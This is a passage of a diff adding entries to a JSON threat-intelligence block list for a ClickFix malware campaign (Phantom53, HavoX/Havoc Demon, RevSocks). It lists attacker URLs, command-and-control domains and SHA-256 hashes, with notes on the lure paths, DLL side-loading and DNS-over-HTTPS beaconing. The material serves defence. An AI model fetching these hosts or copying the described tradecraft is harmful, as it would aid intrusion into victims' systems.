+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "https://gist.githubusercontent.com/yegeqebige46-creator/b393f36b20ad8aeadcb8a80af70ccc09/raw/da03fd7f1ffacda970a1f3d345bdaeae8c6a7b43/gistfile1.txt",
+     "type": "url",
+     "confidence": "med",
+     "recommended_action": "alert",
+     "description": "GitHub Gist file that hosted an earlier Phantom53 installer before the operators moved to Cloudflare Workers.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "https://github.com/yegeqebige46-creator/qq/raw/main/update.zip",
+     "type": "url",
+     "confidence": "med",
+     "recommended_action": "alert",
+     "description": "Operator GitHub repository file update.zip, an earlier Phantom53 package in which GUP.exe side-loads a malicious libcurl.dll.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "dns.timesyncserver-312453.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Operator OPS command-and-control domain.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027546/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "securedoc.makeneg458.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "XaocMail Cloudflare Worker that serves the document-sharing ClickFix lure and the MSI, PowerShell and HTA payloads.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027547/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "securedoc.mesuttgulerr573.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "XaocMail Cloudflare Worker that serves the ClickFix lure at /?id= and payloads at /m?id= (MSI), /s?id= (PowerShell) and /h?id= (HTA).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027548/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "linkrot.fypahedupal2-0maz.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker that rotates the securedoc workers.dev subdomain on every visit so takedowns do not break the lure links.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027549/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "cdn-analytics-p53.makeneg458.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker that collects Phantom53 victim telemetry.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027550/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "cdn-analytics-3f4033.rosamariaeadeshtvfud.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker that collects Phantom53 victim telemetry.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027551/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "sync-node-serv.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Domain used by the HavoX (Havoc Demon) post-exploitation stage.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027552/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "dns.cdn-syncnode-server.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Domain used by the HavoX (Havoc Demon) post-exploitation stage.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027553/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "cdn-assets-api.cfchk902834.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker relay that the HavoX (Havoc Demon) implant connects to for command and control.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027554/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "cdn-assets-api.makeneg458.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker relay that the HavoX (Havoc Demon) implant connects to for command and control.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027555/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "cdn-assets-api.kessler-m88.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker relay that the HavoX (Havoc Demon) implant connects to for command and control.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027556/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "cdn-assets-api.busykifukek2-8psk.workers.dev",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Cloudflare Worker relay that the HavoX (Havoc Demon) implant connects to for command and control.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027557/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "a8f2aac37385.xyz",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Phantom53 command-and-control domain queried through DNS-over-HTTPS AAAA lookups.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027558/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "kfkwrfdd.xyz",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Phantom53 command-and-control domain queried through DNS-over-HTTPS AAAA lookups.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027559/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "544504d7fe1e.xyz",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Phantom53 command-and-control domain queried through DNS-over-HTTPS AAAA lookups.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027560/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "bestutyresdomaonupder.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "RevSocks reverse-proxy domain reached over secure WebSockets.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027561/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "bestutyresdomaonupder.top",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "RevSocks reverse-proxy domain reached over secure WebSockets.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027562/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "bestutyresdomaonupder2324.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "RevSocks reverse-proxy domain reached over secure WebSockets.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2027563/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "bceeb2d54b6a756c73a3e06617e9e95ad4d8e53da47639bcd6ef3cae98c6da6d",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "HTA payload delivered by the XaocMail ClickFix lure (mshta mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/bceeb2d54b6a756c73a3e06617e9e95ad4d8e53da47639bcd6ef3cae98c6da6d/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "79a4cb73983a1facb5db09f1a20cec6e58d91a93044a78aa3ba32ab2190284ed",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PowerShell payload delivered by the XaocMail ClickFix lure (powershell mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/79a4cb73983a1facb5db09f1a20cec6e58d91a93044a78aa3ba32ab2190284ed/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "0e1c94a8f94158f64558325ddbfd1e1277884fba6fb1f8c381dbd5c742e59fbb",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "build_v4.py, the operator script that builds Phantom53 MSI installers.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/0e1c94a8f94158f64558325ddbfd1e1277884fba6fb1f8c381dbd5c742e59fbb/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "efc4b8c1968c06e598a6f6f98398d44b488198b497291fe30fb792d696b6cb81",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "adminka, the Phantom53 operator administration panel.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/efc4b8c1968c06e598a6f6f98398d44b488198b497291fe30fb792d696b6cb81/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "4f656834e545c0b44922ce6d8952989c8c0859d8ae8b1f117c06ab07b047e2b4",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "beacon.pyd, the Phantom53 DoH beacon dropped as cv2.pyd and loaded by pythonw.exe.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/4f656834e545c0b44922ce6d8952989c8c0859d8ae8b1f117c06ab07b047e2b4/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "8ebb2bf61b48ae7abdcd674413bebd79b30ddd945854e175ba60d56c0a3adf54",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "watcher.pyd, the Phantom53 watcher dropped as core.pyd that reflectively loads the Havoc Demon on demand.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/8ebb2bf61b48ae7abdcd674413bebd79b30ddd945854e175ba60d56c0a3adf54/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "a4ad001c6900176eba43a747ae5d212db6fc78f7ef4e777f276cbbdf8099dbe8",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "demon.dat, the AES-GCM encrypted Havoc Demon blob decrypted in memory by the watcher.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "dc57638cb90798835848a9dafec228bef7738def50f4f2db612862e07c5b6f8a",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "demon_dbg.dat, the AES-GCM encrypted debug build of the Havoc Demon.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "56582934901cce0b618d6a50e54c9db29bf2d444636bcd40b5975a765ecde538",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "gistfile1.txt, an earlier Phantom53 installer in which GUP.exe side-loads a malicious libcurl.dll.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/56582934901cce0b618d6a50e54c9db29bf2d444636bcd40b5975a765ecde538/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "009099ba10365b44bdb3ecc28dfcbed6a594ec0a0df86931620cdaac9843e611",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "update.zip, an earlier Phantom53 package in which GUP.exe side-loads a malicious libcurl.dll.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/009099ba10365b44bdb3ecc28dfcbed6a594ec0a0df86931620cdaac9843e611/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "0aff424f9a02eb9f429119c4caa05e85fc952603549d69849e745293d20235d6",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "libcurl.dll, the malicious DLL side-loaded by the Notepad++ updater GUP.exe in earlier Phantom53 packages.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/0aff424f9a02eb9f429119c4caa05e85fc952603549d69849e745293d20235d6/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "7055483a77f679ad569c3a9bfe76cdb8e5b96efc44d2bf2a6f08e930add598b0",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/7055483a77f679ad569c3a9bfe76cdb8e5b96efc44d2bf2a6f08e930add598b0/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "0dcfe51d2521e52a469f5cec6b42bc8e7e37b41df993cce7d739ff3fd248d8b1",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/0dcfe51d2521e52a469f5cec6b42bc8e7e37b41df993cce7d739ff3fd248d8b1/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "bd1c005f35e4fd8c61dfa6f20d4c03e082c692e286a3b22dd642369c8d5e3564",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/bd1c005f35e4fd8c61dfa6f20d4c03e082c692e286a3b22dd642369c8d5e3564/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "dbd252becd490ac47e16bff4391ab9e6237c4f7e81ab6784c57fa2eed751f477",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/dbd252becd490ac47e16bff4391ab9e6237c4f7e81ab6784c57fa2eed751f477/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "e9e57a57ee45b8faae2e47affd8cf3a6d0cc1283802108f7298ae1d2ef3b43f0",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/e9e57a57ee45b8faae2e47affd8cf3a6d0cc1283802108f7298ae1d2ef3b43f0/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "d2d41b249905deae3bd6bcaa547872d747256a7dfa459b509d9db9de8f0ca29b",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
